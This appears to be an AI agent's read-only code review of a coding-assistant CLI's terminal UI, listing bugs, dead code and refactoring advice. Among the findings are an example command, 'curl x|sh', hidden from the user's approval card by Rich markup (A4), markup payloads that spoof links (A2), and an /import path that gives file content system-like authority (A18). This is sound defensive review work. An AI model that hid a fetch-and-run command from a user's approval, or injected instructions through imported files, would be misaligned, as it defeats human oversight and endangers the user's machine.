<!-- Source: review agent bf60b087-0249-4455-9edd-ca9f5b0d767e · CoderAI working tree @ 2026-09-22 (incl. uncommitted changes) · read-only review -->

# Terminal UI (ui/shell, ui/print, terminal, utils/rich)

The review found 31 verified problems in the terminal UI, 8 of them high severity. Two are the most urgent. First, the interactive REPL doesn't catch exceptions from slash commands, so any error in one exits CoderAI. Second, untrusted text is printed with Rich markup turned on in many places — shell and web output, session titles, and the command shown for approval. That text can crash the display or hide part of what's shown. I changed no files; I only read code and ran small import and rendering checks.

**Wiring:** the production entry point is `coderai.main` → `coderai/ui/shell/app.py:main` → `_run_interactive`, which uses `dispatch.registry`. The new `Shell` class in `ui/shell/__init__.py`, `replay.py`, `visualize/_interactive.py` and `visualize/_live_view.py` are only reachable from the untracked `coderai/app.py`, which nothing imports. `agents_cmd.py` and `review_cmd.py` are wired in through `dispatch.py`.

---

## (A) Bugs and bad implementations

**A1. High: an exception in any slash command kills the REPL.** `app.py:2079-2106`
- `dispatch_slash_command(...)` sits inside `while True` with no `try`. The loop's only enclosing `try` has just a `finally` (line 1919 → 2354), and `main()` only catches `KeyboardInterrupt`.
- Any `AttributeError`, network error or Rich `MarkupError` raised by a handler escapes `asyncio.run`, prints a traceback and ends the session.
- Fix: wrap dispatch in `try/except Exception`, log it, print an escaped error and `continue`. Handle `CancelledError` and `KeyboardInterrupt` the same way the turn path does.
- Confidence: high (control flow verified).

**A2. High: tool cards print shell and web output as Rich markup.** `visualize/_blocks.py`
- The affected lines:
  - Line 937: "escape unless already styled" (`line.startswith("[") and line.endswith("]")`) prints any output line that looks like `[...]` as raw markup.
  - Lines 1036-1041: web search title, URL and snippet.
  - Lines 1075 and 1080: fetched page content (`pl[:100]` can also cut a tag in half).
  - Line 1226: the tool name, which can come from an external MCP server, is not escaped.
- What I reproduced:
  - `[tool.ruff]` disappears from output.
  - `[/usr/bin]` and `hello [/b] world` raise `MarkupError`.
  - `[link=…]click[/link]` shows only "click" (hyperlink spoofing).
- Impact: `render_tool_card` is called from `SessionManager.on_assistant_message` without a guard (`soul/session/manager.py:1776/1915/1976`). A crash there aborts tool dispatch in the middle of a turn. Web pages can also hide or restyle text.
- Fix: build output as `Text(line)` or always `escape()`. Pre-styled error lines should be `Text` objects, not marked-up strings.
- Confidence: high.

**A3. High: saved session titles can permanently crash `/sessions` and `--resume`.** `session_picker.py:732-735` and `290-296`
- `s.summary` (user- or model-written) and the typed filter text (`cur_query`, line 287) go straight into markup. The file never calls `escape()`.
- One saved session whose summary contains `[/x]` crashes the picker every time. Because of A1, that also crashes the REPL, and `coderai --resume` fails at startup.
- Fix: escape `disp_title`, `desc` and `cur_query`, or build the menu from `Text` objects.
- Confidence: high.

**A4. High: the fallback approval card can hide part of the command being approved.** `app.py:562-567`
- `Command: [bold white]{command}[/]` interpolates the model-generated command and description into markup.
- This fallback runs whenever stdin isn't a TTY, or when the panel path fails. Failures are silently swallowed at `app.py:528-531` and `439-440`.
- A command like `ls [black on black]; curl x|sh[/]` renders with the dangerous part invisible. A stray `[/…]` raises, and the turn fails while the session is still waiting on the permission.
- Fix: `escape(command)` and `escape(description)`, or use `Text`. Log panel exceptions instead of swallowing them.
- Confidence: high.

**A5. High: after Ctrl-C mid-stream, every later input (including `/exit`) is only "queued".** `app.py:1172`, `2016-2075`, `2328-2340`
- `on_chunk` sets `_STREAM_STATE.is_streaming = True`. The interrupt handler never calls `_STREAM_STATE.reset()` or `ensure_newline()`, and `interrupt_session` emits no assistant message.
- On the next loop, `classify_input(..., is_streaming=True)` returns QUEUE for everything. Queued items only drain after a turn runs, which never happens, so only Ctrl-D escapes.
- The `MarkdownStreamRenderer` Live display (auto-refresh thread) also keeps redrawing over the prompt.
- Fix: call `_STREAM_STATE.reset()` in every interrupt and exception path. Base `is_streaming` only on `active_turn_task`, since input is never read during a turn in this REPL anyway.
- Confidence: medium-high (traced in code, not reproduced interactively).

**A6. High: `/logout` never removes saved API keys but reports success.** `slash.py:1299-1311`
- It clears `providers[*].api_key` only if `resolve_current_settings()` contains `providers`. I checked the real key list: it never does, so `write_settings` never runs.
- The top-level `apiKey` in `~/.coderai/settings.json` and keys in `.env` stay on disk. `cmd_reload` then runs `load_dotenv` and puts the keys back in the environment.
- Latent risk: if the branch ever ran, it would write the merged settings (including the env-derived `apiKey`) into the user settings file.
- Fix: read and write the raw user and project settings files (`read_settings`/`read_project_settings`). Remove `apiKey` and `providers.*.api_key` there, and report exactly what was removed.
- Confidence: high.

**A7. High/Medium: shell mode blocks the event loop for up to 120 seconds.** `app.py:1965-1990`
- Ctrl-X shell mode runs `subprocess.run(raw, shell=True, capture_output=True, timeout=120)` synchronously.
- While it runs, background MCP loading, subagents and notifications all freeze. Interactive programs hang until the timeout because output is captured.
- Output is printed as `f"[dim]{out}[/]"`, so a markup error lands in the misleading "shell error" message.
- The unused `Shell._run_shell_command` has the correct pattern: `asyncio.create_subprocess_shell` plus a SIGINT handler that terminates the child.
- Fix: port that pattern and print output as `Text`.
- Confidence: high.

**A8. Medium: Ctrl-C handling is inconsistent, and one code path is dead.** `app.py:1776-1833`
- `_async_sigint` never resets `sigint_count` and prints nothing.
- Ctrl-C during non-turn async work (`/compact`, `/review`, `/mcp reconnect`, `/flow:`) is silently ignored the first time and hard-exits the second time.
- After one interrupted turn the count stays at 1, so the next Ctrl-C outside a turn exits immediately.
- `_sigint_handler` and the `old_sigint_handler` restore are unreachable, because `get_running_loop()` can't raise inside a running coroutine and `install_sigint_handler` catches its own errors.
- `main` (2877), `_run_once` (2453) and `run_exec_session` (`print/__init__.py:167`) return 0 on interrupt; scripts would expect 130.
- Fix: track a "current cancellable" task for slash commands too, reset the counter after a timeout or new prompt, and delete the dead sync path.
- Confidence: high.

**A9. Medium: approval and question prompts block the event loop.**
- `_prompt_permissions` and `_prompt_user_questions` are synchronous. They read raw keys and call `input()`, and they're called from the async `_drain_pending_interactions` (`app.py:1556`, `1586`). Everything else stalls while a menu is open.
- Other blocking calls:
  - `input()` for "Press Enter to dismiss btw" (`app.py:2058`).
  - `input()` for plan refinement (`app.py:2301`).
  - `cmd_feedback` `input()` (`slash.py:1081`).
  - `cmd_upgrade` runs a nested `asyncio.run` in a thread and blocks on `.result()` during the pip install (`slash.py:1253-1261`).
- Fix: run these with `await asyncio.to_thread(...)`, or use prompt_toolkit `Application.run_async`.
- Confidence: high.

**A10. Medium: Ctrl-O runs `$EDITOR` while prompt_toolkit still controls the terminal.** `prompt.py:3225-3237`
- The key handler calls `open_external_editor` → `subprocess.run(f"{editor} {temp_path}", shell=True)` synchronously while the app is in raw mode. This corrupts the display and blocks the loop. The path is also unquoted.
- Fix: use `event.current_buffer.open_in_editor()` or `run_in_terminal`, and `shlex.quote` the path.
- Confidence: high.

**A11. Medium: Ctrl-C in a multiline continuation sends the partial text.** `prompt.py:3443-3448`
- `except (KeyboardInterrupt, EOFError): break` returns the joined partial buffer, and the REPL runs it as a turn. Users expect Ctrl-C to cancel.
- Fix: re-raise `KeyboardInterrupt`; only `EOFError` should finish the buffer.
- Confidence: high.

**A12. Medium: the arrow-key picker spins at 100% CPU when stdin hits EOF.** `session_picker.py:353-424` and `432-513`
- `_read_single_key()` returns `""` on EOF or error. `select_with_arrows` has no branch for `""`, so it loops forever while re-rendering.
- Fix: treat `""` as cancel.
- Confidence: high.

**A13. Medium: `/agents tree` and `/agents report` drop statuses and can crash (new code).** `dispatch.py:345-349`, `agents_cmd.py:39` and `57`
- `_emit` → `console.print(text)` treats `[running]` and `[completed]` as style tags. I verified that "agt_1 [running] fix bug" prints as "agt_1  fix bug".
- Subagent descriptions and reports are model-written, so they can also crash rendering.
- Fix: `console.print(text, markup=False)` or `Text(text)`.
- Confidence: high.

**A14. Medium: other places that print untrusted text as markup.**
- In `dispatch.py`:
  - Jobs table label (174), which is a shell command.
  - Schedule prompt (230).
  - Agent role description from `.md` files (316).
  - Teams table (1304, 1320).
  - MCP error message (578).
  - The `/btw` answer as `Panel(answer)` (1346-1348). A markup error here shows up as "Side question failed".
- In `slash.py`: `cmd_title` (1179).
- In `app.py`: queued input (2072) and pasted-text echo (2119).
- In `ui/print/__init__.py:143`: the `[coderai]` prefix is swallowed because it looks like a tag.
- Fix: add one `_emit_plain()` helper that uses `markup=False`, and use it everywhere.
- Confidence: high.

**A15. Medium: `/effort xhigh` is rejected even though the rest of the app offers it.** `dispatch.py:873`
- `valid_efforts` is hard-coded to `max/high/medium/low/off`.
- `xhigh` was added to the picker (`session_picker.py:614`), the help text (`slash.py:448`), argparse (`startup.py:388`) and config.
- Picking XHigh in the menu, or typing `/effort xhigh`, prints "Invalid effort level".
- Fix: use `config.VALID_REASONING_EFFORTS`.
- Confidence: high.

**A16. Medium: API keys are shown in plain text as you type them.** `setup.py:296` and `374`
- `_read_input` supports `getpass` through `is_secret`, but no caller passes `is_secret=True`. Keys stay visible in the terminal scrollback.
- Confidence: high.

**A17. Medium: PTY terminal output buffers grow without limit.** `terminal/manager.py:20`, `71-72`, `190-191`
- `DEFAULT_MAX_BUFFER_CHARS` is defined but never enforced. `output_buffer` and `_unread_buffer` grow forever (for example `tail -f`, or a long build).
- Each 8 KiB chunk is decoded separately with `errors="replace"`, which corrupts UTF-8 characters split across reads.
- `send` (168) doesn't handle partial or `EAGAIN` writes on the non-blocking fd.
- Fix: use a bounded deque or trim to the cap, `codecs.getincrementaldecoder`, and a write loop.
- Confidence: high.

**A18. Medium: `/import` labels arbitrary file content as a system message.** `dispatch.py:1118-1140`
- The file content is inserted as a *user* message wrapped in `<system>…</system>`, so a hostile file gets system-like authority.
- The path resolves against the current directory rather than `project_root`, with no `expanduser`.
- The usage text and catalog promise "file or session_id", but session import isn't implemented.
- It uses the private `mgr._build_message` / `_append_message`.
- Confidence: high.

**A19. Low/Medium: `/delete` (alias `/rm`) with no arguments deletes the current session without confirmation.** `dispatch.py:695-711`
- Confidence: high.

## (B) Inconsistencies and duplication

**B1. High: a second, unreachable and broken UI stack (~4.5k lines, mostly new).** `ui/shell/__init__.py:69-1480`
- It includes `Shell` (1,286 lines), `_BackgroundCompletionWatcher` and `WelcomeInfoItem`, plus `prompt.CustomPromptSession` (1,084 lines), `visualize/_live_view.py`, `_interactive.py`, `replay.py` and `ui/print/visualize.py`.
- It is broken in several ways:
  - `Shell._run_slash_command` imports `Reload, SwitchToVis, SwitchToWeb` from `coderai.cli`, which raises ImportError (verified).
  - It calls handlers as `command.func(self, args)` with a `Shell` object instead of a `ShellContext`.
  - `coderai/app.py` imports `coderai.ui.print.Print` (ImportError, verified) and `coderai.ui.acp` (doesn't exist).
- Side effect: any `import coderai.ui.shell.X` now runs this 1,700-line `__init__`, which pulls in kosong and the soul modules and sets up a circular path (`slash.__getattr__` → `dispatch`).
- Fix: either finish the port and switch the entry point to it, or move `render_welcome_screen` into its own module, slim `__init__.py` back down and delete the stack.
- Confidence: high.

**B2. Medium: three slash-command registries that disagree.**
- The three sources are the `ui/shell/slash._COMMANDS` catalog (used by `/help` and completion), `dispatch.registry` (execution) and `soul/slash.registry`.
- Things I verified:
  - Triggers that exist only in the registry, so they have no completion or help: `browser, roles, side, swarm, team, vis, web, web-vis, web_vis`.
  - Canonical names are swapped: the catalog has `rename` with alias `title`, while the registry has `title` with alias `rename`. The catalog treats `resume` as its own command; the registry makes it an alias of `sessions`.
  - The `/help` overview (`HELP_GROUPS`) leaves out `add-dir, afk, yolo, agent, context, import, reset`.
  - `COMMAND_HELP_DETAILS["reasoning"]` can never be shown, because the alias resolves to `effort` first.
  - The soul registry reimplements init, compact, yolo, afk, plan, add-dir, export and import separately, and maps `/reset` to its `clear` (clears context). In the UI, `/clear` clears the screen and `/reset` drops the session.
- There are also two unrelated classes called `SlashCommand`: `display_name` is a property in `slash.py:22` and a method in `slashcmd.py:12`, and `prompt.py:251` works around the difference.
- Fix: one registry, with catalog, help and completion generated from its decorators.

**B3. Medium: help text doesn't match behaviour, and argument parsing is inconsistent.**
- `/plan reset` is documented as "reset plan mode state" but deletes the plan file (`dispatch.py:767`).
- Unknown arguments silently toggle: `/plan foo` (783) and `/thinking foo` (634).
- `/goal` usage omits `start` (536).
- The README says `/raw` gives a "raw-scrollback" mode; there isn't one.
- `/mcp` uses `startswith` without strip or lowercasing (558-586), so `/mcp reconnectfoo` reconnects a server called "foo".
- Commands variously use `split(None,1)`, `split(maxsplit=2)`, `startswith` or `strip().lower()`. A shared subcommand parser would fix this.
- Confidence: high.

**B4. Low/Medium: duplicated helpers that have drifted apart.**
- In `app.py`, `_queue_skill` (1631), `_render_help_menu` (1595) and `_show_diff` (1600) duplicate code in `dispatch.py`. `_show_diff` falls back to `git diff HEAD`, but `/diff` doesn't.
- The "if console: console.print else print" pattern is repeated about 100 times across dispatch and slash.
- `select_with_arrows` duplicates its whole key state machine for the Live and non-Live paths (353-424 vs 454-513).
- The `_Cmd`/`_Tmp` command shims are duplicated in `prompt.py` (201-211 and 3148-3158).
- `_read_single_key` contains mock-detection hacks for tests in production code (`session_picker.py:92-105`).

**B5. Low: leftover Kimi branding and stray signal handling.**
- `__init__.py:258` ("Restart kimi"), 402-403 (`KIMI_CLI_NO_AUTO_UPDATE` vs `CODERAI_NO_AUTO_UPDATE`) and 407 ("Kimi Code CLI").
- `MarkdownStreamRenderer.start` installs a SIGWINCH handler through `signal.signal` on every stream and never restores it (`_blocks.py:1849-1854`).

## (C) Verified dead code

**Orphan modules and stacks**
- `ui/shell/export_import.py` is confirmed never imported. It only re-exports `utils.export` and appears only in `egg-info/SOURCES.txt`. Delete it.
- The whole B1 stack is dead in production: `Shell`, `WelcomeInfoItem`, `_print_welcome_info` (`__init__.py:184-1578`), `visualize.visualize()` (`visualize/__init__.py:114`), `_interactive.py`, `_live_view.py`, `replay.py`, `CustomPromptSession`, `ui/print/visualize.py` (tests only), `migration_nudge.print_migration_goodbye`, `mcp_status.render_mcp_prompt` and `echo.py`. They are only used by `Shell` or tests.

**Unfinished scaffolding in `_StreamState` (`app.py`)**
- `visualize()` (1448) is never called, so `_live_ref` is never set. The Live branch of `_show_panel_pager` (238-248) never runs.
- `compose_live_group` (1433), `compose_interactive_panels` (1315), `compose_agent_output` (1340), `has_expandable_panel` (1364), `_show_expandable_panel_content` (1378), `on_retry` (1274), `on_status_update` (1294), `_ensure_unified_block` (1256) and `set_question_panel` (1401) are unused.
- The fields `_pending_approvals`, `_pending_questions`, `_live_notifications`, `_status_block` and `_retry_banner` are unused. The `_unified_block` branches in `ensure_newline` (1234-1246) can't run.

**Unused functions in `app.py`**
- `error_callout` (67), nested `_live_deny` (331), `_render_help_menu` (1595), `_show_diff` (1600), `_queue_skill` (1631), and `_sigint_handler` (1781), which is unreachable.

**Other unused symbols**

| File | Unused symbols |
|---|---|
| `session_picker.py` | `_format_badges_markup` (516), `prompt_plan_implementation` (921) |
| `_approval_panel.py` | `expand_plan_in_pager` (655) |
| `_btw_panel.py` | `compose_for_live` (155) |
| `_blocks.py` | `ContentBlock` (317), `NotificationBlock`/`StatusBlock`/`TodoBlock` aliases (628-630), `BULLET_FRAMES` (751), `make_plan_progress_bar` (1339), `StatusSpinner` (1519) with `pause_for_pager` (1580), `MultiStepProgress` (1603) with `advance`, `_find_committed_boundary_parser` (1779) |
| `prompt.py` | `PROMPT_SYMBOL_THINKING`/`PLAN` (90-91), `_render_agent_prompt_label` (2100), `format_streamlined_status_bar` (3889), `_is_multiline_trigger` (4079) |
| `theme.py` | `get_task_browser_style` (227); `plan_prompt` (144) is set but never read |
| `keyboard.py` | `listen_for_keyboard` (89) |
| `migration_nudge.py` | `install_run_command`, `coderai_installed`, `welcome_card_text`, `already_installed_text` (21-68) |
| `update.py` | `UpdateResult.UNSUPPORTED` (29) |
| `utils/rich/syntax.py` | `resolve_color_system` (83) |
| `utils/rich/diff_render.py` | `is_inline_paired` (82/251/253), write-only |
| `utils/slashcmd.py` | `slash_name` (24), `iter_command_entries` (101) |
| `utils/term.py` | `get_cursor_row` (183) |
| `terminal/manager.py` | `get_full_output` (213), `DEFAULT_MAX_BUFFER_CHARS` (20), see A17 |

- `pop_steer` (`prompt.py:3358`) is never called, so the Ctrl-S "steer" binding just submits the buffer like Enter. That's a broken feature, not just dead code.

**Vulture false positives in this area (not dead)**
- All `dispatch.cmd_*` functions (registered by decorator).
- About 30 `_` keybinding handlers and `_toggle_*` / `_external_editor` / `_expand_pager` in `prompt.py` (registered by `@kb.add`).
- `preferred_width`, `preferred_height` and `create_content`, plus the `wrap_lines` / `get_line_prefix` parameters (prompt_toolkit UIControl interface).
- `console._CoderAIPager.show` (Rich Pager override).
- `WelcomeInfoItem.Level.WARN` and `ERROR` (enum members).
- `should_connect` and `signum` (required callback signatures).
- `slash.__getattr__` (used by `from …slash import registry`).
- `render_statusline` (called by name from a string at `prompt.py:3726`).

**Ruff B023:** all 56 hits in `app.py` and the one in `oauth.py:78` are false positives. The closures are called in the same loop iteration, either synchronously inside the approval loop or created as a task and awaited immediately; the `oauth.py` lambda is consumed by the blocking `wait_for_device_token`. Binding values through default arguments would quiet the lint.

## (D) Size and structure smells

**D1. High: `prompt.py` is 4,138 lines.**
- It merges four former modules (markers at 2734, 3456, 3510, 3970) and contains two prompt-session classes. `CustomPromptSession` is 1,084 lines with a 367-line `__init__` and is used only by the dead stack.
- Suggested split: `completers.py`, `file_mention.py`, `statusline.py`, `input_buffer.py`, `ptk_session.py`.

**D2. High: `app.py` is 2,882 lines.**
- The biggest pieces: `_run_interactive` is 737 lines, `_prompt_permissions` 505, `main` 413, `_prompt_user_questions` 374, `_main` 175 and `_StreamState` about 420.
- Suggested split:
  - `repl.py`, with one handler each for btw, shell mode, slash commands, turns and plan review.
  - `approvals.py`, with a single key-source abstraction replacing the three duplicated input modes (Live, raw keys, `input()`).
  - `stream_state.py`.
  - `entry.py`.

**D3. Medium: `_blocks.py` is 1,952 lines** and merges six modules (thinking, tool_card, plan_render, progress, markdown_stream). Split it along those markers.

**D4. Medium: the command modules mix too much.**
- `dispatch.py` (1,478 lines, about 60 commands) should be grouped into `commands/{session,models,diagnostics,io}.py`.
- `slash.py` (1,340 lines) holds the catalog, about 650 lines of help data and command implementations. The help data should be generated from the registry, and `cmd_version`, `cmd_logout` and the rest should move next to their handlers.

**D5. Medium: `session_picker.py` is 1,456 lines.**
- It mixes pickers with MCP, config, token and history renderers and a price table (`MODEL_PRICING_PER_M`, which belongs with model capabilities).
- `select_with_arrows` is 297 lines and `_read_single_key` 191.
- `startup._build_parser` is 380 lines on its own.

**D6. Medium: `ui/shell/__init__.py` is 1,732 lines**, which is far too heavy for a package `__init__`. Move `render_welcome_screen` into `welcome.py` and keep `__init__` empty.
